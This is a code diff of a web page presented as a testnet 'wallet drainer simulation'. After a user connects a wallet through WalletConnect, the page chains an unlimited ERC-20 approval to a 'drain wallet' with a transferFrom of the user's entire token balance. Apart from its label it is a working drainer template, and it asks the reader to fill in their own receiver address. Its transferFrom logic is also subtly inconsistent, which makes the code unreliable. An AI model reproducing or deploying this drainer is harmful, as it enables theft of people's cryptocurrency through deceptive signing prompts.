@@ -1,73 +1,87 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>WalletConnect v2 Testnet DApp</title>
+  <meta charset="UTF-8">
+  <title>Wallet Drainer Simulation</title>
+  <script src="https://unpkg.com/@walletconnect/web3modal@2.7.2/dist/index.umd.js"></script>
+  <script src="https://unpkg.com/ethers@6.6.2/dist/ethers.umd.min.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #0f0f0f;
+      color: white;
+      text-align: center;
+      padding: 40px;
+    }
+    button {
+      background: #1e90ff;
+      color: white;
+      border: none;
+      padding: 15px 30px;
+      font-size: 16px;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+  </style>
 </head>
 <body>
-  <h1>WalletConnect v2 Testnet Token Drainer (Simulation)</h1>
-  <button id="connect">Connect Wallet</button>
-  <button id="approve">Approve Tokens</button>
-  <button id="drain">Transfer Tokens</button>
+  <h1>Simulated Token Drainer</h1>
+  <button id="connectBtn">Connect Wallet</button>
 
   <script type="module">
-    import { EthereumClient, w3mConnectors, w3mProvider } from "https://unpkg.com/@web3modal/ethereum?module";
-    import { Web3Modal } from "https://unpkg.com/@web3modal/html?module";
-    import { configureChains, createConfig, getAccount, watchAccount } from "https://unpkg.com/@wagmi/core?module";
-    import { mainnet, sepolia } from "https://unpkg.com/@wagmi/core/chains?module";
-    import { createPublicClient, createWalletClient, http } from "https://unpkg.com/viem?module";
+    import { EthereumProvider } from "https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.3";
 
-    const projectId = "0ca7babc6d9c2f3eabc56f96b19083fc"; // Free public projectId
-    const chains = [sepolia];
+    const projectId = "f50fd9a8234e03fc76d81243b2d56b65"; // Public WalletConnect v2 project ID
+    const tokenAddress = "0xYourTestnetTokenAddress"; // Replace with testnet ERC-20 address
+    const receiverAddress = "0xReceiverWalletAddress"; // Replace with your drain wallet address
 
-    const { publicClient } = configureChains(chains, [w3mProvider({ projectId })]);
-    const wagmiConfig = createConfig({ autoConnect: true, connectors: w3mConnectors({ projectId, chains }), publicClient });
+    let provider;
+    let signer;
 
-    const ethereumClient = new EthereumClient(wagmiConfig, chains);
-    const modal = new Web3Modal({ projectId }, ethereumClient);
-
-    let walletClient;
-    let userAddress;
-    const tokenAddress = "0xYourTestnetTokenAddress"; // Replace with your testnet token (ERC20)
-    const drainAddress = "0xReceiverWalletAddress";   // Replace with your receiver wallet (you control it)
-
-    document.getElementById("connect").onclick = async () => {
-      await modal.openModal();
-    };
-
-    watchAccount({
-      onChange(account) {
-        userAddress = account.address;
-        console.log("Connected address:", userAddress);
-      }
-    });
-
-    document.getElementById("approve").onclick = async () => {
-      walletClient = await ethereumClient.getWalletClient();
-      const tx = await walletClient.writeContract({
-        address: tokenAddress,
-        abi: [
-          "function approve(address spender, uint256 amount) public returns (bool)"
-        ],
-        functionName: "approve",
-        args: [drainAddress, BigInt(1000000 * 1e18)]
+    async function connectWallet() {
+      provider = await EthereumProvider.init({
+        projectId,
+        chains: [11155111], // Sepolia
+        showQrModal: true,
       });
-      console.log("Approval TX:", tx);
-    };
 
-    document.getElementById("drain").onclick = async () => {
-      walletClient = await ethereumClient.getWalletClient();
-      const tx = await walletClient.writeContract({
-        address: tokenAddress,
-        abi: [
-          "function transferFrom(address from, address to, uint256 amount) public returns (bool)"
-        ],
-        functionName: "transferFrom",
-        args: [userAddress, drainAddress, BigInt(1000000 * 1e18)]
-      });
-      console.log("Draining TX:", tx);
-    };
+      await provider.enable();
+
+      const ethersProvider = new ethers.BrowserProvider(provider);
+      signer = await ethersProvider.getSigner();
+
+      alert(`Connected: ${await signer.getAddress()}`);
+      await approveToken();
+    }
+
+    async function approveToken() {
+      const erc20 = new ethers.Contract(tokenAddress, [
+        "function approve(address spender, uint256 amount) public returns (bool)"
+      ], signer);
+
+      const tx = await erc20.approve(receiverAddress, ethers.MaxUint256);
+      await tx.wait();
+      alert("✅ Approved token spending!");
+
+      await drainTokens();
+    }
+
+    async function drainTokens() {
+      const erc20 = new ethers.Contract(tokenAddress, [
+        "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
+        "function balanceOf(address account) public view returns (uint256)"
+      ], signer);
+
+      const from = await signer.getAddress();
+      const balance = await erc20.balanceOf(from);
+
+      const tx = await erc20.transferFrom(from, receiverAddress, balance);
+      await tx.wait();
+
+      alert(`💸 Drained ${ethers.formatUnits(balance)} tokens to ${receiverAddress}`);
+    }
+
+    document.getElementById("connectBtn").onclick = connectWallet;
   </script>
 </body>
 </html>
